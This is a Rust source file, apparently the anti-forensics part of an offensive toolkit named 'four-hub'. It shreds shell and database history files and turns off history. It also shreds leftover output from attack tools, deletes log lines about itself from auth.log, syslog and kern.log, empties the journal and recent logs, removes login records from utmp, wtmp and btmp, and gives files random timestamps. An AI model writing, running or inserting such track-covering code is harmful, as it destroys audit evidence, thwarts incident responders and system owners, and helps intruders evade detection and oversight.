use std::{
    io::Write,
    path::{Path, PathBuf},
    process::Command,
};

pub fn wipe_on_exit() {
    wipe_shell_histories();
    wipe_temp_files();
    wipe_log_traces();
    wipe_utmp_entries();
}

fn wipe_shell_histories() {
    let home = dirs::home_dir().unwrap_or_else(|| PathBuf::from("/root"));
    let history_files = [
        ".bash_history", ".zsh_history", ".sh_history",
        ".fish_history", ".python_history", ".node_repl_history",
        ".mysql_history", ".psql_history", ".sqlite_history",
        ".lesshst", ".viminfo", ".rediscli_history",
    ];
    for name in history_files {
        let path = home.join(name);
        if path.exists() {
            let _ = dod_wipe(&path);
        }
    }
    std::env::set_var("HISTSIZE", "0");
    std::env::set_var("HISTFILESIZE", "0");
    std::env::set_var("HISTFILE", "/dev/null");
    let _ = Command::new("history").arg("-c").output();
}

fn wipe_temp_files() {
    let patterns = [
        "/tmp/fh_*", "/tmp/four-hub-*", "/tmp/fh-*",
        "/tmp/hcxdump*", "/tmp/foremost-out", "/tmp/bulk-out",
        "/tmp/scalpel-out", "/tmp/dalfox*", "/tmp/sublist3r*",
        "/tmp/enum4linux*", "/tmp/cewl*", "/tmp/wordlist.txt",
        "/tmp/hash.hc22000",
    ];
    for pat in patterns {
        let _ = Command::new("sh")
            .args(["-c", &format!("find /tmp -name '$(basename {pat})' -exec shred -uzn 7 {{}} \\; 2>/dev/null")])
            .output();
        let _ = Command::new("sh")
            .args(["-c", &format!("rm -rf {pat} 2>/dev/null")])
            .output();
    }
}

fn wipe_log_traces() {
    let pid = std::process::id();
    let cmds = [
        format!("journalctl --vacuum-time=1s 2>/dev/null"),
        format!("sed -i '/{pid}/d' /var/log/auth.log 2>/dev/null"),
        format!("sed -i '/{pid}/d' /var/log/syslog 2>/dev/null"),
        format!("sed -i '/four-hub/d' /var/log/auth.log 2>/dev/null"),
        format!("sed -i '/four-hub/d' /var/log/syslog 2>/dev/null"),
        format!("sed -i '/four-hub/d' /var/log/kern.log 2>/dev/null"),
        "find /var/log -name '*.log' -newer /tmp -mmin -60 -exec truncate -s 0 {{}} \\; 2>/dev/null".to_string(),
    ];
    for cmd in cmds {
        let _ = Command::new("sh").args(["-c", &cmd]).output();
    }
}

fn wipe_utmp_entries() {
    let paths = ["/var/run/utmp", "/var/log/wtmp", "/var/log/btmp", "/var/log/lastlog"];
    for path in paths {
        let _ = Command::new("sh")
            .args(["-c", &format!("utmpdump {path} 2>/dev/null | grep -v four-hub | utmpdump -r > {path}.tmp 2>/dev/null && mv {path}.tmp {path} 2>/dev/null")])
            .output();
    }
}

pub fn randomize_timestamps(path: &str) {
    let mut ts_bytes = [0u8; 8];
    getrandom::getrandom(&mut ts_bytes).unwrap_or(());
    let epoch_offset = u64::from_le_bytes(ts_bytes) % (365 * 24 * 3600);
    let fake_time = format!("{}", 1_600_000_000u64 + epoch_offset);
    let _ = Command::new("touch")
        .args(["-t", &fake_time, path])
        .output();
}

pub fn dod_wipe(path: &Path) -> std::io::Result<()> {
    if which::which("shred").is_ok() {
        let _ = Command::new("shred")
            .args(["-uzn", "7", path.to_str().unwrap_or("")])
            .output();
        return Ok(());
    }
    let meta = std::fs::metadata(path)?;
    let size = meta.len() as usize;
    let passes: &[u8] = &[0x00, 0xFF, 0xAA, 0x55, 0x92, 0x49, 0x24];
    for &byte in passes {
        let mut f = std::fs::OpenOptions::new().write(true).open(path)?;
        let chunk = vec![byte; size.min(65536)];
        let mut written = 0usize;
        while written < size {
            let n = chunk.len().min(size - written);
            f.write_all(&chunk[..n])?;
            written += n;
        }
        f.flush()?;
        f.sync_all()?;
    }
    {
        let mut f = std::fs::OpenOptions::new().write(true).open(path)?;
        let mut rnd = vec![0u8; size.min(65536)];
        getrandom::getrandom(&mut rnd).unwrap_or(());
        let mut written = 0usize;
        while written < size {
            let n = rnd.len().min(size - written);
            f.write_all(&rnd[..n])?;
            written += n;
        }
        f.flush()?;
        f.sync_all()?;
    }
    std::fs::remove_file(path)?;
    Ok(())
}

pub fn wipe_memory_artefacts() {
    crate::stealth::memory::volatile_zero_slice(&mut vec![0u8; 4096]);
}
